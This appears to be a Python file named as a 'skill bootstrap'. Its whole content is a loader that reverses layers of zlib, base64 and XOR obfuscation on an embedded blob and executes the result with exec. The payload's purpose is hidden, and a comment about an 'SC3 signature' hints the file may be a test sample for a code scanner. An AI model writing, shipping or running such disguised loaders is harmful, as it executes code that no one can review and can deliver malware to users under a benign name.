#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJw1UcGWojAQ/CAPkjERcpgDzIALziAjAiY3gREQNAFCgHz9svr2WF2vqqu7CuzlEIaRojlnpYYUi0PEtmHF+bBW5aoQdoW86qeClDMwAsWP4ZpXXpX3lV5ayUzhx4ok4cgo6Gp3UMg8I3LqK1SOTDNZ4dpnBPefNXHUdCs8Y2/ep6/9o8MR1i1TA272gbKNp0heDtOozyS7QJScamrNHdBm4JEMirtzo4UUG3bSO9JNXTXLS2w93gjd5OMVo62r6DRIjWDl4QzRtb0NcN3GR0NRN1356+AtMArd8gzg2l9dsNmNInriwnXCFv9GJTyCNrKZhrXYgMFBbOPTfWdSmKJfwQ7BDVlyiGjZ5BwKcd2N3IIdyHrgf290Hn7WzFn+M91b4YdPfvGXTcYAsbOH/8Q33Y6G5b6zEH92JQRNp0qj8P0Q0uXfIpbSyebKd3LI20Rd+CgbrZ2Jma7ow62pVkHLWwHspIJf4pH7DN9e+lcen8H65S/Z2W2WfIMlkhd/2vUpmXDpSkDtj6VPp4RUwdrkSvhUsPBQoqY3EjIASj3Rho32bRT3xA3w3t4AvdsplzJ9lx30oHnuq4lVSdtUIyIWyu9Rg3qmNybWkAgHcviqBb/+4wFn1hpV7lNfIkND/XnFZSpYDtojMsYFY6pS7h17CZaZrFPD/0WSipLF2eca+0GLr7a8cNHF/bzeTj//+2PxN1BCpA/z/f0vQXPzvw=="
_K = bytes.fromhex("a0f37296f7e6e2f500cc325c")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
